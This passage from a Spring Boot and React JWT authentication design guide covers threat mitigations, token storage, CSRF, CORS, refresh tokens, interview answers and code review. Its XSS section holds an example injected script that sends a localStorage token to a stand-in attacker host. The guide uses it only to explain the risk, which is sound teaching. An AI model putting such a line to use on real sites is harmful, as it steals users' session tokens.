| **Password theft** | BCrypt hashing | Done | `BCryptPasswordEncoder` |
| **Token forgery** | HMAC-SHA256 signature | Done | `Jwts.builder().signWith(signingKey)` |
| **Token tampering** | Signature verification | Done | `Jwts.parser().verifyWith(signingKey)` |
| **Expired token reuse** | Expiration claim | Done | `exp` claim, auto-verified by JJWT |
| **CSRF** | Stateless + Bearer tokens | Done | No cookies → CSRF not applicable |
| **CORS abuse** | Explicit origin whitelist | Done | `http://localhost:5173` only |
| **User enumeration** | Generic error messages | Done | "Invalid email or password" for both cases |
| **SQL injection** | Parameterized queries | N/A | No database yet; use JPA when connected |
| **XSS (token theft)** | — | Partial | localStorage is XSS-vulnerable; httpOnly cookies are safer |
| **Brute force** | Rate limiting | Not yet | Add Spring Boot rate limiter or API gateway |
| **Token stolen** | Short expiry + refresh | Partial | 24h expiry; refresh tokens not yet implemented |
| **Secret key leak** | Env variables | Not yet | Currently hardcoded in properties |
| **HTTPS** | TLS/SSL | Not yet | Required for production — tokens travel in headers |
| **Timing attacks** | Constant-time compare | Done | BCrypt handles this internally |

### 9.2 JWT Secret Protection

**Current risk:** The JWT secret is hardcoded in `application.properties`:

```properties
jwt.secret=MyHardcodedSuperSecretKeyForDevelopmentOnly2024ThatIsLongEnoughForHS256
```

**If this secret is compromised:** An attacker can forge valid JWT tokens for any user — effectively impersonating anyone in the system.

**Production fix:**

```properties
# application.properties
jwt.secret=${JWT_SECRET}
```

```bash
# Set as environment variable
export JWT_SECRET=$(openssl rand -base64 64)
```

### 9.3 XSS Prevention and Token Storage

**The problem:** We store the JWT in `localStorage`:

```javascript
localStorage.setItem("token", token);
```

`localStorage` is accessible to any JavaScript running on the page. If an attacker injects malicious JavaScript (XSS), they can steal the token:

```javascript
// Attacker's injected script:
fetch("https://evil.com/steal?token=" + localStorage.getItem("token"));
```

**Mitigation strategies (ranked by security):**

1. **httpOnly cookie** (most secure) — browser sends automatically, JavaScript can't access
2. **In-memory variable** (good) — lost on page refresh, but immune to XSS persistence
3. **sessionStorage** (moderate) — cleared when tab closes, but still XSS-vulnerable
4. **localStorage** (current — least secure) — persists across tabs and refreshes, XSS-vulnerable

**Why we use localStorage for now:** Development convenience — token survives page refresh. For production, migrate to httpOnly cookies.

### 9.4 CSRF Prevention

**Why CSRF is not a concern for us:**

CSRF attacks work by tricking a browser into sending cookies to a target site. Since we use Bearer tokens (not cookies), the browser never automatically attaches the token to cross-origin requests. An attacker's site can't include `Authorization: Bearer ...` headers in requests it triggers.

```java
// SecurityConfig:
.csrf(csrf -> csrf.disable())  // Safe because we don't use cookies for auth
```

**Warning:** If you later switch to httpOnly cookies for token storage, you MUST re-enable CSRF protection or use the `SameSite=Strict` cookie attribute.

### 9.5 CORS Configuration

```java
CorsConfiguration config = new CorsConfiguration();
config.setAllowedOrigins(List.of("http://localhost:5173"));   // Only our frontend
config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE", "OPTIONS"));
config.setAllowedHeaders(List.of("*"));
config.setAllowCredentials(true);
```

**What this prevents:** Malicious websites at other origins cannot make API calls to our backend. The browser enforces this — it sends a preflight `OPTIONS` request, checks the `Access-Control-Allow-Origin` header, and blocks the request if the origin isn't whitelisted.

**Production change:** Replace `http://localhost:5173` with the actual domain (e.g., `https://app.example.com`). Consider reading from environment variables:

```java
config.setAllowedOrigins(List.of(allowedOrigin));  // from @Value("${cors.allowed-origin}")
```

### 9.6 Input Validation

**First line of defense — Jakarta Validation:**

```java
@NotBlank → prevents null, "", and "   "
@Email   → validates email format (regex-based)
@Size(min=6) → minimum password length
```

**Second line — business logic validation:**

```java
if (userStore.containsKey(request.getEmail())) {
    throw new UserAlreadyExistsException("Email already registered");
}
```

**What's NOT validated yet (add before production):**
- Password complexity (uppercase, lowercase, number, special char)
- Email domain validation (block disposable emails)
- Name length limits
- Request size limits (prevent oversized payloads)

---

## 10. Error Handling Strategy

### 10.1 Error Hierarchy

```
┌──────────────────────────────────────────────────┐
│                  Global Level                     │
│  JwtAuthEntryPoint → 401 for unauthenticated     │
│  (Future: @ControllerAdvice for global handling)  │
└──────────────────────┬───────────────────────────┘
                       │
┌──────────────────────▼───────────────────────────┐
│               Controller Level                    │
│  AuthController catch blocks → specific status    │
│  UserAlreadyExistsException → 409                │
│  InvalidCredentialsException → 401               │
└──────────────────────┬───────────────────────────┘
                       │
┌──────────────────────▼───────────────────────────┐
│               Validation Level                    │
│  @Valid + Jakarta annotations → 400              │
│  Automatic — Spring handles before controller    │
└──────────────────────────────────────────────────┘
```

### 10.2 Error Responses by Scenario

| Scenario | HTTP Status | Response Body | Who Handles |
|---|---|---|---|
| Invalid JSON / missing fields | 400 | Spring default validation errors | Jakarta Validation |
| Email already exists | 409 | `{"message": "Email already registered"}` | AuthController |
| Wrong email or password | 401 | `{"message": "Invalid email or password"}` | AuthController |
| Missing/invalid token on protected route | 401 | `{"error": "Unauthorized", "message": "..."}` | JwtAuthEntryPoint |
| Expired token | 401 | Same as above (caught by `isTokenValid()`) | JwtAuthFilter → JwtAuthEntryPoint |
| Server error | 500 | Spring default | Spring Boot |

### 10.3 Frontend Error Handling

```javascript
// LoginForm.jsx
try {
    await handleLogin(formData.email, formData.password);
    navigate("/home");
} catch (err) {
    setError(err.response?.data?.message || "Invalid email or password");
}
```

The frontend reads `err.response.data.message` from the Axios error response, which contains the backend's error message. If the backend is unreachable, it falls back to the default string.

### 10.4 Recommended: Global Exception Handler (Future)

```java
@RestControllerAdvice
public class GlobalExceptionHandler {

    @ExceptionHandler(InvalidCredentialsException.class)
    public ResponseEntity<AuthResponse> handleInvalidCredentials(InvalidCredentialsException e) {
        return ResponseEntity.status(HttpStatus.UNAUTHORIZED)
                .body(AuthResponse.builder().message(e.getMessage()).build());
    }

    @ExceptionHandler(UserAlreadyExistsException.class)
    public ResponseEntity<AuthResponse> handleUserExists(UserAlreadyExistsException e) {
        return ResponseEntity.status(HttpStatus.CONFLICT)
                .body(AuthResponse.builder().message(e.getMessage()).build());
    }

    @ExceptionHandler(MethodArgumentNotValidException.class)
    public ResponseEntity<Map<String, List<String>>> handleValidation(MethodArgumentNotValidException e) {
        List<String> errors = e.getBindingResult().getFieldErrors().stream()
                .map(FieldError::getDefaultMessage)
                .toList();
        return ResponseEntity.badRequest().body(Map.of("errors", errors));
    }
}
```

This centralizes error handling, removing try-catch blocks from controllers.

---

## 11. Refresh Token Architecture

### 11.1 Why Refresh Tokens Are Needed

**Problem with access-token-only approach:**
- Short-lived access tokens (15 min) → user must re-login frequently
- Long-lived access tokens (24h) → larger damage window if token is stolen
- No way to revoke a JWT — it's valid until it expires

**Solution — two-token system:**
- **Access token** (15 min) — sent with every API request, short-lived, stateless
- **Refresh token** (7 days) — sent only to `/api/auth/refresh`, long-lived, stored in database, revocable

### 11.2 Refresh Token Lifecycle

```
┌──────┐                  ┌──────────┐               ┌──────────┐
│Client│                  │  Server  │               │    DB    │
└──┬───┘                  └────┬─────┘               └────┬─────┘
   │                           │                          │
   │ POST /login               │                          │
   │ {email, password}         │                          │
   │──────────────────────────►│                          │
   │                           │  Generate access token   │
   │                           │  Generate refresh token  │
   │                           │  Store refresh token ────┼──────────►│
   │                           │                          │           │
   │  {accessToken,            │                          │
   │   refreshToken}           │                          │
   │◄──────────────────────────│                          │
   │                           │                          │
   │  ... 15 minutes later ... │                          │
   │                           │                          │
   │  API call with expired    │                          │
   │  access token             │                          │
   │──────────────────────────►│                          │
   │  401 Unauthorized         │                          │
   │◄──────────────────────────│                          │
   │                           │                          │
   │  POST /api/auth/refresh   │                          │
   │  {refreshToken: "..."}    │                          │
   │──────────────────────────►│                          │
   │                           │  Validate refresh token  │
   │                           │  Check in DB ────────────┼──────────►│
   │                           │  Not revoked? Not expired?│◄─────────│
   │                           │                          │
   │                           │  Generate NEW access token│
   │                           │  Rotate refresh token    │
   │                           │  (old → revoked,         │
   │                           │   new → stored)──────────┼──────────►│
   │                           │                          │
   │  {accessToken (new),      │                          │
   │   refreshToken (new)}     │                          │
   │◄──────────────────────────│                          │
```

### 11.3 Token Rotation Strategy

**Rotation** means issuing a new refresh token every time the old one is used. This limits the damage if a refresh token is stolen:

1. Legitimate user refreshes → gets new refresh token, old one is revoked
2. Attacker tries to use stolen (now-revoked) old token → server detects reuse, revokes ALL tokens for that user
3. User must re-login → attacker is locked out

### 11.4 Revocation Strategy

Since refresh tokens are stored in the database, revocation is straightforward:

```sql
-- Revoke a specific token (on refresh rotation)
UPDATE refresh_tokens SET revoked = TRUE WHERE token = ?;

-- Revoke all tokens for a user (on password change or suspicious activity)
UPDATE refresh_tokens SET revoked = TRUE WHERE user_id = ?;
```

### 11.5 Multi-Device Login

Each device gets its own refresh token. Revoking one device's token doesn't affect others:

```
Device A → Refresh Token A → valid
Device B → Refresh Token B → valid
Device C → Refresh Token C → revoked (user logged out from C)
```

"Log out from all devices" revokes all tokens for that user.

---

## 12. Interview Questions and Answers

### 12.1 Beginner Level

**Q: What is JWT and why is it used?**

**A:** JWT (JSON Web Token) is a compact, self-contained token format for securely transmitting information between parties as a JSON object. It's used for stateless authentication — the server doesn't need to store session data because all the information needed to verify the user's identity is embedded in the token itself.

A JWT has three parts: header (algorithm), payload (claims like user email and expiration), and signature (cryptographic proof that the token hasn't been tampered with).

**Common mistake:** Saying JWT is "encrypted." JWT is *signed*, not encrypted. The payload is Base64-encoded and readable by anyone. Encryption is optional (JWE), but most JWT implementations use only signing (JWS).

---

**Q: What's the difference between authentication and authorization?**

**A:** Authentication answers "Who are you?" — it verifies identity (login with email/password → receive JWT). Authorization answers "What can you do?" — it checks permissions (does this user have the ADMIN role to access `/api/admin/*`?).

In our Spring Security implementation, `JwtAuthFilter` handles authentication (validates the token, sets the user identity), and `SecurityConfig.authorizeHttpRequests()` handles authorization (checks which roles can access which endpoints).

**Common mistake:** Using the terms interchangeably. They're sequential steps — authentication always comes first.

---

**Q: Why shouldn't you store passwords as plaintext?**

**A:** Three reasons: (1) Database breaches are common — plaintext passwords would be immediately usable; (2) Users reuse passwords — a breach of your app compromises their accounts on other services; (3) Legal regulations (GDPR, PCI-DSS) require hashing.

We use BCrypt, which is an adaptive hash function with a built-in salt. Even if two users have the same password, their hashes are different because each gets a unique random salt.

**Common mistake:** Saying "we encrypt passwords." Encryption is reversible (decrypt with the key). Hashing is one-way — you can't recover the original password from the hash. We *hash*, not encrypt.

### 12.2 Intermediate Level

**Q: How does Spring Security's filter chain work with JWT?**

**A:** Spring Security processes every HTTP request through a chain of filters, in order. Our custom `JwtAuthFilter` is registered *before* `UsernamePasswordAuthenticationFilter` using `addFilterBefore()`.

The flow: (1) CORS filter runs first, (2) our `JwtAuthFilter` extracts the Bearer token, validates it via `JwtService`, and sets the `SecurityContextHolder` with the authenticated user, (3) the authorization filter checks if the `SecurityContext` has a valid authentication for the requested endpoint.

If `JwtAuthFilter` doesn't set the `SecurityContext` (no token or invalid token), and the endpoint requires authentication, Spring Security invokes `JwtAuthEntryPoint.commence()` which returns a 401 JSON response.

**Common mistake:** Putting the JWT filter *after* `UsernamePasswordAuthenticationFilter`. The JWT filter must run first so the authentication is set before Spring Security's built-in filters check for it.

---

**Q: Explain the difference between `@Component`, `@Service`, `@Configuration`, and `@Bean` in the context of this project.**

**A:** They're all Spring stereotypes for dependency injection:

- `@Component` — generic Spring-managed bean. We use it for `JwtAuthFilter` and `JwtAuthEntryPoint` because they're not services or controllers.
- `@Service` — semantic specialization of `@Component` for business logic. `AuthService`, `JwtService`, `CustomUserDetailsService` use this.
- `@Configuration` — marks a class that defines `@Bean` methods. `SecurityConfig` uses this because it produces the `SecurityFilterChain`, `PasswordEncoder`, and `AuthenticationManager` beans.
- `@Bean` — method-level annotation inside `@Configuration` classes. The return value becomes a Spring-managed bean. We use it for `PasswordEncoder` because `BCryptPasswordEncoder` is a third-party class we can't annotate with `@Component`.

**Common mistake:** Using `@Bean` on a method outside a `@Configuration` class (it works in `@Component` with "lite mode" but with caveats around proxying).

---

**Q: Why is `OncePerRequestFilter` used instead of a regular `Filter`?**

**A:** A regular `javax.servlet.Filter` can execute multiple times per request if the request is internally forwarded or dispatched (e.g., error handling, request dispatching). `OncePerRequestFilter` guarantees exactly one execution per request.

For JWT validation, this matters because: (1) we don't want to validate the token twice (wasted work), (2) if the filter sets the `SecurityContext`, running twice could cause subtle bugs, (3) error handling dispatches (like 404 forwarding) would trigger re-validation.

**Common mistake:** Implementing `javax.servlet.Filter` directly and not realizing it runs multiple times per request in certain scenarios.

### 12.3 Advanced Level

**Q: Your JWT is stored in localStorage. How would you defend against XSS token theft?**

**A:** localStorage is accessible to any JavaScript on the page, so an XSS attack can steal the token. Defense in depth:

1. **Primary fix:** Move token to an httpOnly cookie — JavaScript can't access it at all. Set `Secure`, `SameSite=Strict`, and `Path=/api` attributes.
2. **If using localStorage (current):** Implement Content Security Policy (CSP) headers to prevent script injection. Sanitize all user-generated content. Use React's built-in XSS protection (JSX auto-escapes).
3. **Limit damage:** Use short-lived access tokens (15 min). Implement refresh token rotation — a stolen refresh token becomes detectable on next legitimate use.
4. **Detection:** Log token usage patterns. Alert on impossible travel (same token used from two countries within minutes).

**Common mistake:** Saying "just use httpOnly cookies" without mentioning that this re-introduces CSRF concerns (you'd need `SameSite=Strict` or CSRF tokens).

---

**Q: How would you handle JWT in a microservices architecture?**

**A:** Switch from HS256 (symmetric) to RS256 (asymmetric):

- **Auth service** holds the private key, signs tokens
- **Other services** hold only the public key, can verify tokens but can't forge them
- If a service is compromised, the attacker can't create fake tokens (they don't have the private key)

Additional considerations: (1) Use a JWKS (JSON Web Key Set) endpoint so services can fetch and cache the public key; (2) Include service-specific claims (`aud` claim) so a token meant for Service A can't be replayed against Service B; (3) Consider an API gateway that validates JWTs once and forwards authenticated requests to internal services.

**Common mistake:** Using HS256 across microservices — every service that knows the secret can forge tokens for any other service.

---

**Q: A user changes their password. What happens to existing JWTs?**

**A:** With our current stateless JWT approach — nothing. Existing tokens remain valid until they expire. This is a known limitation of pure JWT.

**Solutions (ranked by complexity):**
1. **Short access token expiry** (15 min) — acceptable delay in most cases
2. **Token version claim** — add a `tokenVersion` field to the user record, include it in JWT claims, increment on password change. The filter checks the version matches.
3. **Token blacklist** — maintain a set of revoked token IDs (`jti` claim) in Redis. Check on every request. Defeats the purpose of stateless JWT but provides immediate revocation.
4. **Refresh token revocation** — revoke all refresh tokens on password change. Existing access tokens work for their remaining lifetime (max 15 min), but no new ones can be obtained.

**Common mistake:** Saying "JWTs are immediately invalidated when the user changes their password." They're not — that's the fundamental trade-off of stateless tokens.

### 12.4 System Design Level

**Q: Design an authentication system for an app with 10 million users.**

**A:** Key decisions:

1. **Token strategy:** Access tokens (15 min, JWT, stateless) + Refresh tokens (7 days, opaque, stored in Redis). Redis gives O(1) lookup and automatic TTL expiration.

2. **Password hashing:** Argon2id (memory-hard, resistant to GPU attacks) with parameters tuned to take ~300ms on production hardware. BCrypt is acceptable but Argon2 is the current best practice.

3. **Rate limiting:** Token bucket algorithm per IP and per email at the login endpoint. 5 attempts per minute per email, 20 per minute per IP. Use Redis for distributed rate limiting.

4. **Scaling:** JWTs are verified purely with crypto — no database call per request. The auth service can be horizontally scaled. Use RS256 so any service can verify without sharing the signing key.

5. **Account lockout:** After 10 failed attempts, lock the account for 30 minutes. Send an email notification. This prevents brute force while limiting denial-of-service risk (attacker can't permanently lock someone out).

6. **Monitoring:** Log all login attempts (success/failure) with IP, user agent, and timestamp. Alert on impossible travel, credential stuffing patterns, and token reuse after revocation.

7. **Secret rotation:** Use a JWKS endpoint with key IDs (`kid` header). To rotate: add new key, sign new tokens with it, keep old key for verification until all old tokens expire, then remove old key.

---

## 13. Project Walkthrough for New Developers

### 13.1 Backend Folder Structure

```
src/main/java/management_system_server/
│
├── ManagementSystemServerApplication.java     ← Entry point — @SpringBootApplication
│
└── features/
    └── auth/                                   ← Authentication domain module
        │
        ├── controller/
        │   └── AuthController.java             ← REST endpoints: /signup, /login
        │
        ├── services/
        │   ├── AuthService.java                ← Business logic: register, login, user lookup
        │   ├── JwtService.java                 ← Token create/validate/parse (JJWT library)
        │   └── CustomUserDetailsService.java   ← Spring Security bridge: User → UserDetails
        │
        ├── security/
        │   ├── SecurityConfig.java             ← Filter chain, CORS, session policy, auth rules
        │   ├── JwtAuthFilter.java              ← Per-request token validation filter
        │   └── JwtAuthEntryPoint.java          ← 401 response handler for unauthenticated requests
        │
        ├── model/
        │   ├── User.java                       ← User POJO (will become @Entity)
        │   ├── Role.java                       ← USER/ADMIN enum
        │   └── RefreshToken.java               ← Placeholder for refresh token entity
        │
        ├── dto/
        │   ├── RegisterRequest.java            ← Signup request body with validation
        │   ├── LoginRequest.java               ← Login request body with validation
        │   ├── AuthResponse.java               ← Response body: token + message
        │   └── RefreshTokenRequest.java        ← Placeholder for refresh token request
        │
        ├── exception/
        │   ├── InvalidCredentialsException.java
        │   ├── UserAlreadyExistsException.java
        │   └── TokenExpiredException.java
        │
        └── repository/
            ├── UserRepository.java             ← Stub — will extend JpaRepository
            └── RefreshTokenRepository.java     ← Stub — will extend JpaRepository
```

### 13.2 File Responsibilities — Quick Reference

| File | One-Line Responsibility |
|---|---|
| `AuthController` | Receives HTTP requests, delegates to service, returns HTTP responses |
| `AuthService` | Orchestrates registration and login — the only file that changes if business rules change |
| `JwtService` | Owns all token logic — the only file that changes if the signing algorithm changes |
| `CustomUserDetailsService` | Sole bridge between our `User` model and Spring Security's `UserDetails` interface |
| `SecurityConfig` | Defines what's public, what's protected, and how the filter chain is assembled |
| `JwtAuthFilter` | Runs on every request (except `/api/auth/**`), extracts and validates the JWT |
| `JwtAuthEntryPoint` | Produces the 401 JSON response when authentication fails |
| `User` | Data shape — fields, types, Lombok annotations |
| `RegisterRequest/LoginRequest` | API contract for what the client must send (with validation rules) |
| `AuthResponse` | API contract for what the server returns |

### 13.3 Startup Process

1. `mvn spring-boot:run` starts `ManagementSystemServerApplication`
2. Spring Boot scans `management_system_server` package for `@Component`, `@Service`, `@Configuration`
3. `SecurityConfig` creates the `SecurityFilterChain` bean, registering `JwtAuthFilter` and `JwtAuthEntryPoint`
4. `AuthService` `@PostConstruct` seeds the test user (`test@example.com` / `password123`)
5. Server listens on port 8080

### 13.4 How to Add a New Protected Route

1. Create a new controller in the appropriate feature package:

```java
@RestController
@RequestMapping("/api/grocery")
@RequiredArgsConstructor
public class GroceryController {

    @GetMapping("/list")
    public ResponseEntity<List<GroceryItem>> getList() {
        // This endpoint is automatically protected — SecurityConfig requires
        // authentication for any path not matching /api/auth/**
        return ResponseEntity.ok(groceryService.getItems());
    }
}
```

2. No changes needed in `SecurityConfig` — the default rule `anyRequest().authenticated()` covers it.

3. On the frontend, include the token in the request:

```javascript
axios.get("/api/grocery/list", {
    headers: { Authorization: `Bearer ${localStorage.getItem("token")}` }
});
```

### 13.5 How to Add a New Role

1. Add to the `Role` enum:

```java
public enum Role {
    USER,
    ADMIN,
    MANAGER    // ← new
}
```

2. Add authorization rule in `SecurityConfig`:

```java
.requestMatchers("/api/reports/**").hasAnyRole("MANAGER", "ADMIN")
```

3. Update `JwtAuthFilter` to read the role from the token (requires adding a `role` claim to `JwtService.generateToken()`).

### 13.6 How to Connect PostgreSQL (Migration Checklist)

1. Remove the `spring.autoconfigure.exclude` line from `application.properties`
2. Set database credentials in `application.properties`
3. Add `@Entity`, `@Table`, `@Id`, `@Column` annotations to `User.java`
4. Make `UserRepository` extend `JpaRepository<User, UUID>`
5. Replace `userStore.get/put/containsKey` calls in `AuthService` with `userRepository.findByEmail()` / `userRepository.save()` / `userRepository.existsByEmail()`
6. Remove the `@PostConstruct seedTestUser()` method (or convert to a `CommandLineRunner` for dev profile only)
7. Run `mvn spring-boot:run` — Hibernate auto-creates the `users` table from annotations

---

## 14. Production Deployment Considerations

### 14.1 Environment Variables

| Variable | Example | Purpose |
|---|---|---|
| `JWT_SECRET` | `base64-encoded-64-byte-random-string` | Signing key for JWTs |
| `JWT_EXPIRATION` | `900000` (15 min) | Access token lifetime |
| `DB_URL` | `jdbc:postgresql://db:5432/mgmt` | Database connection |
| `DB_USERNAME` | `app_user` | Database user (not `postgres`) |
| `DB_PASSWORD` | `from-vault` | Database password |
| `CORS_ORIGIN` | `https://app.example.com` | Frontend URL |
| `BCRYPT_STRENGTH` | `12` | BCrypt cost factor (2^12 iterations) |

### 14.2 Secret Management

| Approach | Suitable For |
|---|---|
| Environment variables | Simple deployments, Docker |
| AWS Secrets Manager / Azure Key Vault | Cloud deployments |
| HashiCorp Vault | Multi-cloud, enterprise |
| Spring Cloud Config Server | Spring ecosystem |
| Kubernetes Secrets | Kubernetes deployments |

**Never:** Commit secrets to git, hardcode in source files, log secrets, include in error messages.

### 14.3 Logging

**Log (with structured JSON logging):**
- Login attempts (success/failure) with timestamp, IP, user agent
- Registration events
- Token validation failures (expired, invalid signature)
- Authorization failures (wrong role)

**Never log:**
- Passwords (raw or hashed)
- JWT tokens (contains user identity)
- Full request bodies on auth endpoints

### 14.4 Scaling JWT Authentication

JWT is inherently scalable because validation is stateless:

```
┌──────────┐
│  Client  │
└────┬─────┘
     │
┌────▼─────┐
│   Load   │
│ Balancer │
└──┬───┬───┘
   │   │
┌──▼┐ ┌▼──┐
│ S1│ │ S2│  ← Any server can validate the JWT
└───┘ └───┘    No shared session store needed
```

**The only shared state** is the signing key — all servers must have the same `JWT_SECRET`. Use environment variables or a config service to distribute it.

**Refresh tokens** require shared storage (PostgreSQL or Redis) since they need server-side validation and revocation.

### 14.5 Token Blacklisting (For Immediate Revocation)

When you need to revoke a JWT before it expires (password change, suspicious activity):

```
Option A: Redis blacklist
─────────────────────────
1. Add a unique ID (jti claim) to each JWT
2. On revocation, add jti to Redis SET with TTL = remaining token lifetime
3. JwtAuthFilter checks Redis before accepting the token
4. Redis auto-expires entries when the token would have expired anyway

Pros: O(1) lookup, automatic cleanup, shared across servers
Cons: Adds Redis dependency, network call per request
```

---

## 15. Future Improvements

### 15.1 Priority Improvements

| Improvement | Effort | Impact | Priority |
|---|---|---|---|
| Connect PostgreSQL | Medium | Persistent data | High |
| Refresh token flow | Medium | Better UX + security | High |
| Move secrets to env vars | Low | Security | High |
| Global exception handler | Low | Cleaner error responses | Medium |
| Rate limiting | Medium | Brute-force protection | Medium |
| Email verification on signup | Medium | Prevents fake accounts | Medium |
| Password complexity rules | Low | Stronger passwords | Medium |
| HTTPS enforcement | Low | Encrypted transport | High (prod) |

### 15.2 OAuth2 / Social Login

Allow login via Google, GitHub, etc.:

```
User clicks "Login with Google"
    → Redirect to Google OAuth consent screen
    → Google redirects back with authorization code
    → Backend exchanges code for Google access token
    → Backend reads user profile from Google API
    → Backend creates/finds local user
    → Backend issues our JWT
    → Frontend proceeds normally
```

Spring Security has built-in OAuth2 client support: `spring-boot-starter-oauth2-client`.

### 15.3 Multi-Factor Authentication (MFA/2FA)

After password verification, require a second factor:

```
Login with email/password
    → Server verifies credentials
    → Server generates TOTP code (Time-based One-Time Password)
    → Server sends code via email/SMS or user enters from authenticator app
    → POST /api/auth/verify-mfa {code: "123456"}
    → Server verifies code
    → Server issues JWT
```

Libraries: `com.warrenstrange:googleauth` for TOTP generation.

### 15.4 Email Verification

```
Signup
    → Server creates user with emailVerified=false
    → Server sends email with verification link (contains signed token)
    → User clicks link → GET /api/auth/verify-email?token=...
    → Server sets emailVerified=true
    → User can now log in
```

### 15.5 Audit Logging

Track all security events:

```java
@Entity
public class AuditLog {
    private UUID id;
    private UUID userId;
    private String action;      // LOGIN_SUCCESS, LOGIN_FAILURE, PASSWORD_CHANGE, etc.
    private String ipAddress;
    private String userAgent;
    private LocalDateTime timestamp;
}
```

---

## 16. Code Review

### 16.1 JwtService — Line-by-Line Review

```java
@Service                                           // Registers as Spring bean for dependency injection
public class JwtService {

    private final SecretKey signingKey;             // Immutable after construction — thread-safe
    private final long expirationMs;               // Token lifetime in milliseconds

    public JwtService(
            @Value("${jwt.secret}") String secret,  // Injected from application.properties
            @Value("${jwt.expiration}") long expirationMs) {
        // Keys.hmacShaKeyFor() creates a SecretKey from raw bytes.
        // For HS256, the key must be >= 256 bits (32 bytes).
        // Our 70-char string exceeds this requirement.
        this.signingKey = Keys.hmacShaKeyFor(secret.getBytes());
        this.expirationMs = expirationMs;
    }

    public String generateToken(String email) {
        Date now = new Date();
        Date expiry = new Date(now.getTime() + expirationMs);

        return Jwts.builder()
                .subject(email)         // "sub" claim — who the token identifies
                .issuedAt(now)          // "iat" claim — when it was created
                .expiration(expiry)     // "exp" claim — when it becomes invalid
                .signWith(signingKey)   // HMAC-SHA256 signature using our secret key
                .compact();             // Serializes to the three-part Base64URL string
    }

    public String extractEmail(String token) {
        // Parses and verifies the token, then returns the "sub" claim
        return extractAllClaims(token).getSubject();
    }

    public boolean isTokenValid(String token) {
        try {
            extractAllClaims(token);   // If this doesn't throw, the token is valid
            return true;
        } catch (JwtException | IllegalArgumentException e) {
            // JwtException covers: ExpiredJwtException, SignatureException,
            // MalformedJwtException, UnsupportedJwtException
            // IllegalArgumentException covers: null or empty token string
            return false;
        }
    }

    private Claims extractAllClaims(String token) {
        return Jwts.parser()
                .verifyWith(signingKey)     // Configure the parser with our signing key
                .build()                    // Build the parser instance
                .parseSignedClaims(token)   // Parse AND verify signature AND check expiration
                .getPayload();              // Return the claims (payload)
    }
}
```

**Design decisions:**
- Constructor injection (not field injection) — enables testing, makes dependencies explicit
- `SecretKey` created once at startup — not on every token operation
- Single `extractAllClaims()` method — DRY; both `extractEmail()` and `isTokenValid()` use it
- Broad catch (`JwtException`) — we only care valid/invalid, not the specific failure reason

**Potential improvements:**
- Add custom claims (role, user ID) to reduce database lookups
- Support key rotation with `kid` (key ID) header
- Cache parsed tokens for repeated validation within the same request

### 16.2 AuthService — Line-by-Line Review

```java
@Service
@RequiredArgsConstructor  // Lombok generates constructor for all final fields
public class AuthService {

    private final JwtService jwtService;           // Token generation
    private final PasswordEncoder passwordEncoder; // BCrypt hashing

    // ConcurrentHashMap: thread-safe for concurrent access from multiple request threads.
    // Key = email (String), Value = User object.
    // This replaces the database during development.
    private final Map<String, User> userStore = new ConcurrentHashMap<>();

    @PostConstruct  // Runs once after dependency injection, before the app serves requests
    public void seedTestUser() {
        User testUser = User.builder()
                .id(UUID.randomUUID())                          // Random primary key
                .name("Test User")
                .email("test@example.com")
                .password(passwordEncoder.encode("password123")) // BCrypt hash
                .role(Role.USER)
                .createdAt(LocalDateTime.now())
                .build();
        userStore.put(testUser.getEmail(), testUser);
    }

    public AuthResponse register(RegisterRequest request) {
        // Check email uniqueness — would be a UNIQUE constraint in PostgreSQL
        if (userStore.containsKey(request.getEmail())) {
            throw new UserAlreadyExistsException("Email already registered");
        }

        User user = User.builder()
                .id(UUID.randomUUID())
                .name(request.getName())
                .email(request.getEmail())
                .password(passwordEncoder.encode(request.getPassword())) // Hash, never store raw
                .role(Role.USER)  // Default role — never trust client-provided roles
                .createdAt(LocalDateTime.now())
                .build();

        userStore.put(user.getEmail(), user);

        // Return message only — no token (user must explicitly log in)
        return AuthResponse.builder()
                .message("User registered successfully")
                .build();
    }

    public AuthResponse login(LoginRequest request) {
        User user = userStore.get(request.getEmail());

        // Single generic error for both "email not found" and "wrong password"
        // This prevents user enumeration attacks
        if (user == null || !passwordEncoder.matches(request.getPassword(), user.getPassword())) {
            throw new InvalidCredentialsException("Invalid email or password");
        }

        // Generate JWT with email as subject
        String token = jwtService.generateToken(user.getEmail());

        return AuthResponse.builder()
                .token(token)
                .message("Login successful")
                .build();
    }

    // Used by CustomUserDetailsService to load user for Spring Security
    public User findByEmail(String email) {
        return userStore.get(email);
    }
}
```

**Design decisions:**
- `@RequiredArgsConstructor` — Lombok generates the constructor, Spring uses it for injection
- Generic login error — security best practice against enumeration
- No token on registration — forces explicit login, supports future email verification
- `Role.USER` hardcoded — never accept role from the client (privilege escalation risk)

**Potential improvements:**
- Return the user's name in `AuthResponse` so the frontend can personalize the UI immediately
- Add `@Transactional` when migrating to JPA (ensures atomicity)
- Emit events (e.g., `UserRegisteredEvent`) for audit logging

### 16.3 SecurityConfig — Line-by-Line Review

```java
@Configuration          // Marks this as a Spring configuration class (produces beans)
@EnableWebSecurity      // Activates Spring Security's web security support
@RequiredArgsConstructor
public class SecurityConfig {

    private final JwtAuthFilter jwtAuthFilter;        // Our custom JWT validation filter
    private final JwtAuthEntryPoint jwtAuthEntryPoint; // Our custom 401 handler

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
                // CORS: allow frontend origin to make cross-origin requests
                .cors(cors -> cors.configurationSource(corsConfigurationSource()))

                // CSRF: disabled because we use Bearer tokens, not cookies.
                // Cookies are sent automatically by the browser (CSRF-vulnerable).
                // Bearer tokens must be explicitly attached (CSRF-immune).
                .csrf(csrf -> csrf.disable())

                // Exception handling: when an unauthenticated request hits a protected
                // endpoint, invoke JwtAuthEntryPoint instead of redirecting to a login page
                .exceptionHandling(ex -> ex.authenticationEntryPoint(jwtAuthEntryPoint))

                // Session management: STATELESS means Spring Security will NEVER create
                // an HttpSession. Every request must carry its own JWT.
                .sessionManagement(session -> session
                    .sessionCreationPolicy(SessionCreationPolicy.STATELESS))

                // Authorization rules (evaluated top to bottom, first match wins):
                .authorizeHttpRequests(auth -> auth
                    .requestMatchers("/api/auth/**").permitAll()  // Public: login, signup
                    .anyRequest().authenticated()                  // Everything else: need JWT
                )

                // Insert our JwtAuthFilter BEFORE Spring's UsernamePasswordAuthenticationFilter.
                // This ensures the JWT is validated before Spring looks for form-based auth.
                .addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class);

        return http.build();
    }

    @Bean
    public CorsConfigurationSource corsConfigurationSource() {
